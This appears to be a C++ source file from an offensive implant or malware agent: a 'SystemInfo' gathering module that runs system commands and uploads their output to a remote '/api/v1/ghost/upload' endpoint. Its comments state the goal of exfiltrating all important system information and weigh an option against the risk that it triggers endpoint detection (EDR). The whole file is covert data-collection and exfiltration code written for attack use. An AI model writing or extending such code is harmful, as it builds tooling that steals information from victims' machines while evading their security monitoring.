#include "modules/gathering/SystemInfo.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Logger.hpp"
#include "network/Comms.hpp"

bool SystemInfoMethod::trigger() {
    std::string data;
    data += SystemUtils::ExecuteCommand("uname -r");    // placeholders for now, the goal would be exfiltrating all important system info right away
    data += SystemUtils::ExecuteCommand("uptime -p");

    if (data.empty()) return false;

    // TODO: possibly write to disk for later exfiltration? think through, cause it'll probably trigger EDR
    LOG_INFO("Uploading info")
    return Comms::UploadFile("/api/v1/ghost/upload", "sysinfo.txt", data);
}
